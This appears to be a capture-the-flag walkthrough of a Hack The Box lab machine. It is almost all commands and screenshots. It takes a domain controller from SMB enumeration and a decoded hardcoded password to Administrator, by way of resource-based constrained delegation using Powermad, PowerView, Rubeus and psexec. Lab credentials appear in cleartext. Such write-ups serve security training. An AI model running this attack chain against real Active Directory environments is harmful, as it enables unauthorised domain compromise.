```
nmap -sS -sC -sV -T5 -Pn 10.10.11.174
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c513fb68-50d1-41b4-8934-27824a4ed58e)

```
smbclient -L \\\\10.10.11.174\\
smbclient \\\\10.10.11.174\\support-tools
```
![image](https://github.com/regarmulia/HTB/assets/33616880/71fa0c96-fe56-4321-851b-d46f6b8f8795)

```
unzip UserInfo.exe.zip
cat UserInfo.exe.config
```
![image](https://github.com/regarmulia/HTB/assets/33616880/98094d02-a256-46d6-9bf1-f38c289f4c73)


```
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-arm64
sudo ./ILSpy
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c25352b4-a0c5-4d1c-bd87-6b71045eee0f)

```
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
        res += chr(e ^ k ^ key2)

print(res)
```
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2b3ae44c-1a69-4e82-92c3-0ffaac79088c)


```
wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
./ApacheDirectoryStudio
Ironside47pleasure40Watchful
```
![image](https://github.com/regarmulia/HTB/assets/33616880/875c3cc4-807f-429a-8bb9-8b8e08ac724e)


```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f0f57e9e-b8fc-4d4d-b8ac-3a129655c56f)


```
Get-ADDomain
echo '10.10.11.174 dc.support.htb' | sudo tee -a /etc/hosts
whoami /groups
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1f8391b0-f0b9-4bac-ac66-73d102f2e7df)


```
sudo neo4j start
/opt/BloodHound/BloodHound-linux-x64 ./BloodHound --no-sandbox

upload SharpHound.exe
./SharpHound.exe
download 20240514001541_BloodHound.zip
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3a94dd19-bd0e-46f4-8099-c5e90c3cb25b)

![image](https://github.com/regarmulia/HTB/assets/33616880/91ef72f1-2187-471b-9c81-94bebd11c9d6)

![image](https://github.com/regarmulia/HTB/assets/33616880/e6e064fc-121f-4fe9-b1c8-2202bedd5815)


```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
upload PowerView.ps1
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3d6b600f-4598-4175-bd67-5112eda8a285)


```
git clone https://github.com/Kevin-Robertson/Powermad.git
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Get-ADComputer -identity FAKE-COMP01
```
![image](https://github.com/regarmulia/HTB/assets/33616880/df2e4c56-b5f0-4166-8893-5f314a1ddd96)


```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ef2757a0-de07-432e-9a48-9a27e403cc85)


```
upload Rubeus.exe
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
58A478135A93AC3BF058A5EA0E8FDB71
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
https://www.browserling.com/tools/remove-all-whitespace
base64 -d ticket.kirbi.b64 > ticket.kirbi
locate ticketConverter.py
./ticketConverter.py ticket.kirbi ticket.ccache
locate psexec.py
KRB5CCNAME=ticket.ccache ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c7d86351-2afa-4ba9-a89f-33e93dbd0ad5)

![image](https://github.com/regarmulia/HTB/assets/33616880/ae871fd3-7dd0-4315-aac9-3859e1180ef7)
